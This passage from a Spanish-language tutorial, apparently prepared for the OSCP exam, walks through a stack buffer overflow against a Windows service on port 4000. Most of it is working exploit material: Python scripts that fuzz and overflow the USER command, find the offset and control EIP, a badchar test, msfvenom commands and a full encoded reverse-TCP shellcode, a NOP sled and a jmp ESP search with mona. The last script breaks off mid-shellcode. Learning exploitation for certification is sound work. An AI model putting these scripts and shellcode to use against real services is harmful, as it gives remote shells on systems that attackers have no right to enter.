Lo bueno de haber creado la lista, es que podemos identificar rápidamente entre qué valores se produce el Búffer Overflow, en otras palabras, si vemos que tras la ejecución de nuestro script en Python el último reporte que se hizo fue **&quot;Enviando 700 bytes...&quot;**, lo conveniente es modificar nuestro script al siguiente contenido:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print &quot;\nUso: python&quot; + sys.argv[0] + &quot; &lt;dirección-ip&gt;\n&quot;
  sys.exit(0)

buffer = &quot;A&quot;*900
ipAddress = sys.argv[1]

port = 4000

try:
  print &quot;Enviando búffer...&quot;
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send(&quot;USER &quot; + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print &quot;\nError de conexión...\n&quot;
  sys.exit(0)

```
Siempre para asegurar es mejor mandarle los 200 caracteres siguientes de nuestro reporte. Tras la ejecución de esta variante, **Immunity Debugger** directamente nos debería reportar la violación de segmento con el valor **41414141** en el registro **EIP**, lo cual hace que ya tengamos una aproximación de tamaño del buffer permitido.

Para que te quedes tranquilo, en el examen te entregarán un script en Python a modo de PoC donde se aplica un desbordamiento de búffer sobre el servicio. Contando con esto, es simplemente ir haciendo los pasos que se enumeran a continuación.

#### Calculando el Offset

Dado que el valor 414141 para el EIP no es algo descriptivo que nos permita hacernos la idea de qué tamaño tiene el buffer permitido, lo que hacemos es aprovecharnos de las utilidades **pattern_create** y **pattern_offset** de Metasploit.

La funcionalidad **pattern_create** nos permitirá generar un puñado de caracteres aleatorios en base a una longitud fijada como criterio. 

Ejemplo:

```bash
$~ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9
```

Para el ejemplo mostrado, hemos generado 900 bytes de caracteres aleatorios, lo único que tendríamos que hacer es sustituir el caracter &quot;A&quot; de nuestra variable _buffer_ por el contenido que **pattern_create** nos ha devuelto:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print &quot;\nUso: python&quot; + sys.argv[0] + &quot; &lt;dirección-ip&gt;\n&quot;
  sys.exit(0)

buffer = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9&quot;

ipAddress = sys.argv[1]

port = 4000

try:
  print &quot;Enviando búffer...&quot;
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send(&quot;USER &quot; + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print &quot;\nError de conexión...\n&quot;
  sys.exit(0)

```

Lo que conseguimos con esto es determinar a través del valor del registro **EIP** desde **Immunity Debugger** una vez se produce la violación de segmento, qué caracteres están sobreescribiendo dicho registro.

Supongamos que el registro **EIP** toma este valor tras la detención del servicio una vez producido el desbordamiento:

**EIP -&gt; 39426230**

A fin de realizar su traducción y ver qué caracteres de nuestro búffer corresponden a estos valores, podemos aplicar el siguiente comando desde terminal:

```bash
$~ echo &quot;\0x39\0x42\0x62\0x30&quot; | xxd -ps -r

9Bb0

```

Lo que hace que inmediatamente veamos los caracteres a los que corresponden dichos valores. Una vez identificados, podemos a través del **pattern_offset** de Metasploit calcular el offset, permitiéndonos así conocer ya el tamaño del buffer previo a la sobreescritura del registro EIP:

```bash
$~ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 9Bb0

[*] Exact match at offset 809
```

#### Controlando el registro EIP

Conociendo ya el offset, podemos tomar el control del registro EIP. Dado que el registro **EIP** apunta a la siguiente dirección a ejecutar (pues dirige el flujo del programa), poder sobrescribir su valor es crucial para conseguir una ejecución alternativa del servicio a nivel de sistema (lo veremos más adelante).

Dado que el offset es 809, podemos crear el siguiente PoC a fin de verificar que tenemos el control del registro **EIP**:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print &quot;\nUso: python&quot; + sys.argv[0] + &quot; &lt;dirección-ip&gt;\n&quot;
  sys.exit(0)

buffer = &quot;A&quot;*809 + &quot;B&quot;*4 + &quot;C&quot;*(900-809-4)

ipAddress = sys.argv[1]

port = 4000

try:
  print &quot;Enviando búffer...&quot;
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send(&quot;USER &quot; + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print &quot;\nError de conexión...\n&quot;
  sys.exit(0)

```

El caracter &quot;C&quot; lo meto como Padding para hacer relleno hasta llegar a los 900 (para trabajar con cifras redondas).

Tras la ejecución del script, desde el **Immunity Debugger** veremos que una vez se produce la violación de segmento, el registro **EIP** toma el valor **42424242**, equivalente a _&quot;B&quot;*4_. Llegados a este punto, es hora de encontrar el lugar en el que situar nuestro Shellcode.

#### Situando y Asignando Espacio al Shellcode

A la hora de hacer Padding con el caracter &quot;C&quot; tras sobrescribir previamente el registro **EIP**, podremos ver desde el **Immunity Debugger** como el registro **ESP** coincide con nuestro relleno. Llegados a este punto, para el caso que estamos tratando se podría decir que nuestro shellcode tendría que tener un total de 87 bytes, cosa que escapa de la realidad, pues en la mayoría de las veces para entablar una conexión reversa se generan un total de 351 bytes aproximadamente desde **msfvenom**.

La idea aquí, es rezar 2 padres nuestros para que tras ampliar considerablemente el relleno, el servicio no crashee de otra forma. En caso de &quot;_crashing_&quot; (vamos a llamarlo así), si vemos que el registro **EIP** ya no vale lo que debería, tendremos que ver hasta qué tamaño podemos hacer relleno sin que el servicio corrompa de otra manera alternativa.

Hay casos como el de Linux que explicaré donde sólo contamos con 7 bytes de espacio. En ese caso la idea consiste en aprovechar estos 7 bytes para a través de 5 bytes definir ciertas instrucciones de desplazamiento y salto entre registros, permitiéndonos insertar nuestro Shellcode en un nuevo registro donde contamos con el espacio suficiente.

Pero para el caso, y de cara a la examinación... no habrá que preocuparse. Modificamos para ello el script de la siguiente forma:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print &quot;\nUso: python&quot; + sys.argv[0] + &quot; &lt;dirección-ip&gt;\n&quot;
  sys.exit(0)

buffer = &quot;A&quot;*809 + &quot;B&quot;*4 + &quot;C&quot;*(1300-809-4)

ipAddress = sys.argv[1]

port = 4000

try:
  print &quot;Enviando búffer...&quot;
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send(&quot;USER &quot; + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print &quot;\nError de conexión...\n&quot;
  sys.exit(0)

```
En este caso ampliamos de forma considerable nuestro relleno, donde tras sobrescribir el registro **EIP**, contamos con un total de 487 bytes de espacio donde los caracteres &quot;C&quot; serán situados. En caso de ver desde **Immunity Debugger** que todo figura como lo esperado, podremos quedarnos tranquilos, pues tenemos espacio suficiente para depositar nuestro Shellcode sobre el registro **ESP**.

#### Detectando los Badchars

Esta será la única complicación del examen, y cuando digo complicación la sitúo entre comillas gestualmente hablando. 

A la hora de generar nuestro Shellcode, existen ciertos caracteres que en función del servicio con el que estemos tratando no son aceptados, causando una ejecución errónea de las instrucciones que pretendamos inyectar a nivel de sistema.

Detectar estos caracteres no es nada complejo, lo único que necesitamos es una estructura como la siguiente:

`&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;
&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;
&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;
&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;
&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;
&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;
&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;
&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;
&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;
&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;
&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;
&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;
&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;
&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;`

A fin de detectar cuáles de estos caracteres no son aceptados por el servicio, configuramos nuestro script de la siguiente forma:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print &quot;\nUso: python&quot; + sys.argv[0] + &quot; &lt;dirección-ip&gt;\n&quot;
  sys.exit(0)

badchars = (&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;
&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;
&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;
&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;
&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;
&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;
&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;
&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;
&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;
&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;
&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;
&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;
&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;
&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)

buffer = &quot;A&quot;*809 + &quot;B&quot;*4 + badchars + &quot;C&quot;*(1300-809-4-255)

ipAddress = sys.argv[1]

port = 4000

try:
  print &quot;Enviando búffer...&quot;
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send(&quot;USER &quot; + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print &quot;\nError de conexión...\n&quot;
  sys.exit(0)

```

Desde **Immunity Debugger**, tras la ejecución del script podremos ver una vez se produce el desbordamiento del búfer los valores que están siendo depositados sobre el registro ESP, correspondiente a nuestros badchars. La idea aquí es caracter que no veamos, caracter que debemos desechar en el envío de nuestros badchars.

Generalmente, los caracteres **\x0a** y **\x0d** suelen ser badchars, pero pueden varían en función del servicio que estemos utilizando. Algo importante a tener en cuenta es el caracter **\x00**, badchar que por norma general no suele ser incluido de forma visual en la estructura de badchars, pues es genérico y siempre debe ser omitido a la hora de generar nuestro Shellcode.

Suponiendo que hemos detectado que los badchars para este caso son **\x00\x0a\x0d**, lo único que nos queda ya es generar nuestro Shellcode. 

#### Generando el Shellcode

El shellcode que se generará a continuación, lo que nos hará será entablar una conexión TCP reversa contra el equipo. Para ello, seguimos la siguiente sintaxis:

```
$~ msfvenom -p windows/shell_reverse_tcp lhost=127.0.0.1 lport=443 -a x86 --platform windows -b &quot;\x00\x0a\x0d&quot; -e x86/shikata_ga_nai -f c

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
&quot;\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1&quot;
&quot;\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20&quot;
&quot;\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20&quot;
&quot;\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04&quot;
&quot;\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd&quot;
&quot;\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51&quot;
&quot;\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d&quot;
&quot;\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b&quot;
&quot;\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7&quot;
&quot;\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6&quot;
&quot;\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09&quot;
&quot;\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6&quot;
&quot;\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c&quot;
&quot;\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98&quot;
&quot;\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14&quot;
&quot;\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d&quot;
&quot;\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68&quot;
&quot;\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0&quot;
&quot;\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9&quot;
&quot;\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12&quot;
&quot;\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0&quot;
&quot;\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9&quot;
&quot;\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09&quot;
&quot;\xc0\x8a\x41\xbe\xe1\x9e&quot;
```
Una vez generado el shellcode, lo añadimos a nuestro script de la siguiente forma:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print &quot;\nUso: python&quot; + sys.argv[0] + &quot; &lt;dirección-ip&gt;\n&quot;
  sys.exit(0)

shellcode = (&quot;\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1&quot;
&quot;\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20&quot;
&quot;\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20&quot;
&quot;\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04&quot;
&quot;\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd&quot;
&quot;\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51&quot;
&quot;\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d&quot;
&quot;\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b&quot;
&quot;\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7&quot;
&quot;\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6&quot;
&quot;\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09&quot;
&quot;\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6&quot;
&quot;\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c&quot;
&quot;\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98&quot;
&quot;\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14&quot;
&quot;\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d&quot;
&quot;\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68&quot;
&quot;\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0&quot;
&quot;\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9&quot;
&quot;\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12&quot;
&quot;\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0&quot;
&quot;\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9&quot;
&quot;\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09&quot;
&quot;\xc0\x8a\x41\xbe\xe1\x9e&quot;)

buffer = &quot;A&quot;*809 + &quot;B&quot;*4 + &quot;\x90&quot;*16 + shellcode + &quot;C&quot;*(1300-809-4-16-351)

ipAddress = sys.argv[1]

port = 4000

try:
  print &quot;Enviando búffer...&quot;
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send(&quot;USER &quot; + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print &quot;\nError de conexión...\n&quot;
  sys.exit(0)

```
La razón por la cual se han insertado los **NOP-sled** (\x90) antes de nuestro Shellcode, es porque el Shellcode necesita un margen de espacio para ser decodificado antes de ser interpretado, pues hemos usado el encoder x86/shikata_ga_nai. Una buena practica es aprovechar el **Immunity Debugger** para analizar instrucción a instrucción cómo se va produciendo el proceso de decodificación, así como probar a no insertar los NOP-sled a fin de corroborar como la ejecución de nuestro Shellcode no es funcional.

Ya teniendo todo esto hecho, lo único que queda es encontrar una dirección de salto al registro ESP.

#### Salto al ESP

Llegando casi al final, para redirigir el flujo del programa y conseguir una ejecución exitosa de nuestro Shellcode, dado que nuestro Shellcode se sitúa en el registro **ESP** por un lado y dado que tenemos el control del registro **EIP** por otro... la idea es hacer que el registro **EIP** apunte hacia el registro **ESP**.

Para ello, no es tan simple como especificar en _Little Endian_ la dirección del registro **ESP**, pues no funcionará. Lo que tendremos que hacer es lograr que el registro EIP apunte hacia una dirección de la memoria con permisos de ejecución y **ASLR** desactivado donde se aplique una instrucción de tipo '**jmp ESP**'. De esta forma, conseguiremos tras apuntar a dicha dirección, que la siguiente instrucción a realizar corresponda a los **NOP's** iniciales del registro **ESP** hasta llegar a nuestro **Shellcode**.

Para ello, lo que tendremos que hacer una vez sincronizados al proceso desde **Immunity Debugger**, es aplicar el siguiente comando en la línea de comandos interactiva de la herramienta:

`!mona modules`

Una vez hecho, se nos listarán un puñado de módulos, de entre los cuales deberemos buscar cuáles no poseen mecanismos de protección y tienen el ASLR desactivado. Para la examinación del OSCP, siempre habrá uno que reúna dichas condiciones.

Tras encontrar el módulo, desde las pestañas superiores en **Immunity Debugger** (las letras iniciales), una de ellas nos permite visualizar si el campo _.text_ del módulo en la memoria tiene permisos de ejecución, en caso de ser así, el módulo seleccionado es un candidato perfecto.

La idea una vez teniendo el módulo candidato, es ver en qué porción de la memoria se está aplicando un salto al registro ESP. Para realizar esta búsqueda, analizamos el equivalente OPCode de la instrucción haciendo uso para ello de la utilidad **nasm_shell.rb** de Metasploit:

```bash
$~ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

nasm &gt; jmp esp
00000000  FFE4              jmp esp
nasm &gt;

```

Sabiendo que a nivel de OPCode, un '**jmp ESP**' figura como **FFE4**, podemos a continuación desde Mona en la línea de comandos interactiva de **Immunity Debugger** realizar la siguiente consulta en la sección de módulos:

`find -s &quot;\xff\xe4&quot; -m modulo.dll`

Suponiendo que se trata de una dll el módulo candidato que hemos encontrado. De manera inmediata, se nos datarán un listado de resultados, donde de entre ellos... deberemos seleccionar aquel cuya dirección de memoria no posea badchars.

Haciendo doble-click en la misma, podremos ver desde la interfaz principal de **Immunity Debugger** como dicha dirección equivale a un jmp ESP. A modo de ejemplo, suponiendo que la dirección es **0x12131415**, se deberían de aplicar al script los siguientes cambios:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print &quot;\nUso: python&quot; + sys.argv[0] + &quot; &lt;dirección-ip&gt;\n&quot;
  sys.exit(0)

shellcode = (&quot;\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1&quot;
&quot;\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20&quot;
&quot;\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20&quot;
&quot;\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04&quot;
&quot;\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd&quot;
&quot;\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51&quot;
&quot;\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d&quot;
&quot;\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b&quot;
&quot;\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7&quot;
&quot;\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6&quot;
&quot;\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09&quot;
&quot;\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6&quot;
&quot;\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c&quot;
&quot;\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98&quot;
&quot;\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14&quot;
&quot;\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d&quot;
&quot;\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68&quot;
&quot;\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0&quot;
&quot;\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9&quot;
&quot;\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12&quot;
